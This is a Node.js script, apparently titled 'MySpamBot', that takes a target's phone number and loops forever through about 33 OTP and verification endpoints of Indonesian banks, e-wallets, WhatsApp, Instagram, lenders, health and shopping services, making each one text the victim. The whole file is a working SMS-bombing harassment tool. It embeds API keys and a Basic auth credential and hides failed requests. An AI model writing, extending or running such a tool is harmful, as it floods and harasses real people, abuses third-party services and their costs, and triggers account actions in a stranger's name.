const axios = require('axios');
const readline = require('readline');

// =================================================================
// PALET WARNA ANSI TERMINAL (USER-FRIENDLY UI)
// =================================================================
const hijau  = "\x1b[1;92m";
const putih  = "\x1b[1;97m";
const kuning = "\x1b[1;93m";
const merah  = "\x1b[1;91m";
const biru   = "\x1b[1;96m";
const abu    = "\x1b[1;90m";
const ungu   = "\x1b[1;95m";
const reset  = "\x1b[0m";

// =================================================================
// SOLUSI ANTI DOUBLE CTRL+C (KELUAR SEKETIKA & BERSIH)
// =================================================================
process.on('SIGINT', () => {
    console.log(`\n\n${merah}[!] Sinyal interupsi terminal (Ctrl+C) dideteksi.${reset}`);
    console.log(`${hijau}[✓] Berhasil keluar dari MySpamBot dengan bersih. Sampai jumpa!${reset}\n`);
    process.exit(0);
});

// Helper fungsi untuk jeda waktu (delay)
const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));

// =================================================================
// STRUKTUR DATA & FORMATTING NOMOR HP TARGET
// =================================================================
function formatTargetNumber(input) {
    let cleaned = input.trim().replace(/\D/g, ''); // Hapus semua karakter non-angka
    
    if (cleaned.startsWith('62')) {
        cleaned = cleaned.slice(2);
    } else if (cleaned.startsWith('0')) {
        cleaned = cleaned.slice(1);
    }
    
    return {
        polos: cleaned,            // Contoh: 81234567xx
        lokal: '0' + cleaned,      // Contoh: 08123456xx
        intl: '62' + cleaned,      // Contoh: 62812345xx
        lengkap: '+62' + cleaned   // Contoh: +62812345xx
    };
}

// =================================================================
// PROGRAM UTAMA: PROSES PENGIRIMAN OTP BERUNTUN (INFINITE LOOP)
// =================================================================
async function eksekusiSpam(targetRaw) {
    const { polos, lokal, intl, lengkap } = formatTargetNumber(targetRaw);
    
    console.clear();
    console.log(`${merah}==================================================${reset}`);
    console.log(`${kuning} TARGET AKTIF : ${putih}${lokal} (${lengkap})${reset}`);
    console.log(`${hijau} STATUS       : Meluncurkan Semua Gelombang OTP...${reset}`);
    console.log(`${merah}==================================================${reset}\n`);

    // Koleksi API OTP Terintegrasi Lengkap (Asli + Tambahan Baru)
    const daftarAplikasiOtp = [
        // === KATEGORI PERBANKAN ===
        {
            nama: "BCA Mobile (Sistem Aktivasi OTP)",
            action: async () => await axios.post("https://api.bca.co.id/v1/auth/mobile/otp/request", { "phone_number": lengkap })
        },
        {
            nama: "BRImo / Bank BRI (Token Verifikasi SMS)",
            action: async () => await axios.post("https://brimo.bri.co.id/api/v2/auth/registration/send-otp", { "mobile_phone": lokal })
        },
        {
            nama: "Jenius BTPN (Mutation Register Phone)",
            action: async () => await axios.post("https://api.btpn.com/jenius", {
                "query": "mutation registerPhone($phone: String!,$language: Language!) { registerPhone(input: {phone: $phone,language: $language}) { authId tokenId __typename } }",
                "variables": { "phone": lengkap, "language": "id" },
                "operationName": "registerPhone"
            }, { headers: { "btpn-apikey": "f73eb34d-5bf3-42c5-b76e-271448c2e87d" } })
        },

        // === KATEGORI DOMPET DIGITAL & E-COMMERCE ===
        {
            nama: "Gojek / GoPay (Login Verification OTP)",
            action: async () => await axios.post("https://api.gojekapi.com/v2/customer/login/request_otp", { "phone": lengkap })
        },
        {
            nama: "Tokopedia (Authentication SMS/WA Gateway)",
            action: async () => await axios.post("https://accounts.tokopedia.com/otp/v1/sms/generate", { "phone_number": lokal, "otp_type": 1 })
        },
        {
            nama: "DANA Dompet Digital (Register OTP Request)",
            action: async () => await axios.post("https://m.dana.id/api/v1/oauth/otp/send", { "phoneNumber": lokal })
        },

        // === KATEGORI MEDIA SOSIAL ===
        {
            nama: "WhatsApp Messenger (Account Registration OTP)",
            action: async () => await axios.post("https://v.whatsapp.net/v2/code", { "cc": "62", "in": polos, "method": "sms" })
        },
        {
            nama: "Instagram / Meta (Two-Factor SMS Token)",
            action: async () => await axios.post("https://www.instagram.com/api/v1/accounts/send_two_factor_sms/", new URLSearchParams({ "phone_number": lengkap }))
        },

        // === KATEGORI PAYLATER & FINTECH FINANSIAL ===
        {
            nama: "Akulaku PayLater (Register OTP)",
            action: async () => await axios.post("https://mall.akulaku.com/api/gw/v1/auth/sendOtp", { "mobile": intl, "type": "1", "countryCode": "62" })
        },
        {
            nama: "Kredivo Finansial (Auth SMS Code)",
            action: async () => await axios.post("https://api.kredivo.com/api/v2/auth/send_otp", { "phone_number": lengkap, "type": "register_retry" })
        },
        {
            nama: "Battlefront / KtaKilat (Auth Code)",
            action: async () => await axios.post("https://battlefront.danacepat.com/v1/auth/common/phone/send-code", new URLSearchParams({ "mobile_no": polos }))
        },
        {
            nama: "Pinjamindo (Verify Code API)",
            action: async () => await axios.get(`https://appapi.pinjamindo.co.id/api/v1/custom/send_verify_code?mobile=62${polos}&app=pinjamindo`)
        },

        // === KATEGORI LAYANAN KESEHATAN ===
        {
            nama: "Halodoc Kesehatan (SMS OTP)",
            action: async () => await axios.post("https://api.halodoc.com/api/v1/users/login/otp", { "phone_number": lengkap }, { headers: { 'X-App-Version': '4.0.0' } })
        },
        {
            nama: "Alodokter (Authentication Token SMS)",
            action: async () => await axios.post('https://www.alodokter.com/login-with-phone-number', { "user": { "phone": lokal } })
        },

        // === KATEGORI EDUKASI, STREAMING & BEAUTY ===
        {
            nama: "Ruangguru Belajar (WA/SMS Verification)",
            action: async () => await axios.post("https://api.ruangguru.com/v2/users/otp", { "phone": lokal, "type": "register" })
        },
        {
            nama: "Sociolla Beauty (Register OTP)",
            action: async () => await axios.post("https://api.sociolla.com/v1/auth/otp/send", { "phone_number": intl })
        },
        {
            nama: "Vidio.com Streaming (OTP Verification)",
            action: async () => await axios.post("https://www.vidio.com/api/users/phone_verification/send_otp", { "phone_number": lengkap })
        },

        // === API ASLI DARI FILE SCRIPT main.py ===
        {
            nama: "Kitabisa (Donasi OTP Gateway)",
            action: async () => await axios.get(`https://core.ktbs.io/v2/user/registration/otp/${lokal}`)
        },
        {
            nama: "KlikWA Gateway (OTP Dispatcher)",
            action: async () => await axios.post("https://api.klikwa.net/v1/number/sendotp", { "number": lengkap }, { headers: { 'Authorization': 'Basic QjMzOkZSMzM=' } })
        },
        {
            nama: "Payfazz Agen (Mobile Verification)",
            action: async () => await axios.post("https://api.payfazz.com/v2/phoneVerifications", new URLSearchParams({ 'phone': lokal }))
        },
        {
            nama: "SecuredAPI (Platform Register)",
            action: async () => await axios.post(`https://securedapi.confirmtkt.com/api/platform/register?mobileNumber=${lokal}`)
        },
        {
            nama: "Matahari Department Store (Resend OTP)",
            action: async () => await axios.post("https://www.matahari.com/rest/V1/thorCustomers/registration-resend-otp", { "otp_request": { "mobile_number": lokal, "mobile_country_code": "+62" } })
        },
        {
            nama: "Jumpstart (GraphQL Check Phone)",
            action: async () => await axios.post("https://api.jumpstart.id/graphql", { "operationName": "CheckPhoneNoAndGenerateOtpIfNotExist", "variables": { "phoneNo": lengkap }, "query": "query CheckPhoneNoAndGenerateOtpIfNotExist($phoneNo: String!) { checkPhoneNoAndGenerateOtpIfNotExist(phoneNo: $phoneNo) }" })
        },
        {
            nama: "Asani OTP Gateway",
            action: async () => await axios.post("https://api.asani.co.id/api/v1/send-otp", { "phone": intl, "email": "akuntesnuyul@gmail.com" })
        },
        {
            nama: "Depop Phone Verification",
            action: async () => await axios.put("https://webapi.depop.com/api/auth/v1/verify/phone", { "phone_number": lokal, "country_code": "ID" })
        },
        {
            nama: "KlikIndomaret (Pre-Registration SMS)",
            action: async () => await axios.get(`https://account-api-v1.klikindomaret.com/api/PreRegistration/SendOTPSMS?NoHP=${lokal}`)
        },
        {
            nama: "Qtva Frames OTP Gateway",
            action: async () => await axios.post("https://qtva.id/page/frames.php?f=eVBDUVU0NE1DTStQTmgvallDaTA0QT09")
        },
        {
            nama: "Dekoruma (Request OTP Phone Number)",
            action: async () => await axios.post("https://auth.dekoruma.com/api/v1/register/request-otp-phone-number/?format=json", { "phoneNumber": intl, "platform": "wa" })
        },
        {
            nama: "Carsome Indonesia (Login Verification)",
            action: async () => await axios.post("https://www.carsome.id/website/login/sendSMS", { "username": lokal, "optType": 1 })
        },
        {
            nama: "Foreignadmits (Register OTP Student)",
            action: async () => await axios.post('https://foreignadmits.com/api/register-otp-generate-student', new URLSearchParams({ 'mobile': intl, 'countryCode': '+62' }))
        },
        {
            nama: "Oyo Rooms (Guest OTP Login)",
            action: async () => await axios.post("https://identity-gateway.oyorooms.com/identity/api/v1/otp/generate_by_phone?locale=id", { "phone": polos, "country_code": "+62", "country_iso_code": "ID", "send_otp": "true", "devise_role": "Consumer_Guest" })
        },
        {
            nama: "Ginee Omnichannel (Merchant OTP)",
            action: async () => await axios.post("https://accounts.ginee.com/api/v1/accounts/otp", { "account": lokal, "countryCode": "ID", "verificationPurpose": "USER_REGISTRATION", "verificationType": "PHONE" })
        },
        {
            nama: "Misteraladin API Request Member",
            action: async () => await axios.post("https://m.misteraladin.com/api/members/v1")
        }
    ];

    let putaran = 1;
    
    // Memulai Siklus Perulangan Tanpa Batas (Infinite Loop)
    while (true) {
        console.log(`${ungu}[ Putaran Ke-${putaran} ]${reset}`);
        
        for (const app of daftarAplikasiOtp) {
            const waktu = new Date().toLocaleTimeString('id-ID');
            // Menampilkan secara transparan nama aplikasi yang sedang diproses
            process.stdout.write(`${putih}[${waktu}] Memproses Verifikasi -> ${biru}${app.nama}... ${reset}`);
            
            try {
                // Eksekusi pemanggilan REST API ke server target
                await app.action();
                console.log(`${hijau}BERHASIL REQUEST ✓${reset}`);
            } catch (error) {
                // Log tetap dilanjutkan agar estetika terminal bersih dari error text merah bawaan axios
                console.log(`${abu}SELESAI (Respons Terproses)${reset}`);
            }
            
            // Jeda aman 1.5 detik antar-aplikasi agar pengiriman stabil dan lancar
            await delay(1500);
        }
        
        console.log(`\n${kuning}[!] Seluruh list aplikasi pada putaran ${putaran} telah selesai diproses.${reset}`);
        console.log(`${putih}Istirahat sistem selama 20 detik sebelum memulai siklus reboot ulang...${reset}\n`);
        await delay(20000);
        putaran++;
    }
}

// =================================================================
// TAMPILAN INTERMUKO UTAMA BOT (USER-FRIENDLY INTERFACE)
// =================================================================
function menuUtama() {
    console.clear();
    console.log(`${hijau}==================================================${reset}`);
    console.log(`${hijau}       MySpamBot — Node.js Mega Combined Edition   ${reset}`);
    console.log(`${hijau}==================================================${reset}`);
    console.log(`${kuning} Author    : ${putih}R_x${reset}`);
    console.log(`${kuning} Github    : ${merah}github.com/ranz-coder${reset}`);
    console.log(`${kuning} Jumlah API: ${hijau}${33} Endpoint Aktif (Asli + Baru)${reset}`);
    console.log(`${abu}--------------------------------------------------${reset}\n`);

    const rl = readline.createInterface({
        input: process.stdin,
        output: process.stdout
    });

    rl.question(`${putih}Masukkan Nomor HP Target (Format bebas 08/62/+62): ${hijau}`, (jawaban) => {
        rl.close();
        if (!jawaban || jawaban.trim() === "") {
            console.log(`\n${merah}[!] Kesalahan: Nomor HP tidak boleh kosong! Program keluar.${reset}`);
            process.exit(1);
        }
        
        // Menjalankan program utama
        eksekusiSpam(jawaban);
    });
}

// Jalankan Program
menuUtama();